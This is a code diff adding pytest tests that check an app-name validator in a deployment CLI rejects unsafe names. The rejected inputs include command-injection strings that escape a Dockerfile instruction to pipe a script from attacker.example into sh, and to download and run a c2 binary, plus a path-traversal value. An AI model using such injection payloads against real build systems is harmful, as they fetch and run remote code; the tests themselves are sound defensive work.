@@ -444,6 +444,40 @@ def test_to_gke_happy_path(
 
 
 # _validate_agent_import tests
+class TestValidateAppName:
+  """Tests for the _validate_app_name function."""
+
+  @pytest.mark.parametrize(
+      "app_name",
+      ["ssr", "my-agent", "my_agent", "agent2", "A", "a" * 63],
+  )
+  def test_accepts_plain_identifiers(self, app_name: str) -> None:
+    # Should not raise.
+    cli_deploy._validate_app_name(app_name)
+
+  @pytest.mark.parametrize(
+      "app_name",
+      [
+          # Breaks out of a Dockerfile instruction.
+          'myagent"\nRUN curl https://attacker.example/x.sh | sh\n#',
+          # Breaks out of the shell-form CMD.
+          "x ; wget http://attacker/c2 -O /tmp/c2 ; sh /tmp/c2 #",
+          # Quotes and spaces.
+          'a" "b',
+          "has space",
+          # Empty and over-long.
+          "",
+          "a" * 64,
+          # Path traversal shape.
+          "../evil",
+      ],
+  )
+  def test_rejects_unsafe_names(self, app_name: str) -> None:
+    with pytest.raises(click.ClickException) as exc_info:
+      cli_deploy._validate_app_name(app_name)
+    assert "Invalid app name" in str(exc_info.value)
+
+
 class TestValidateAgentImport:
   """Tests for the _validate_agent_import function."""
 
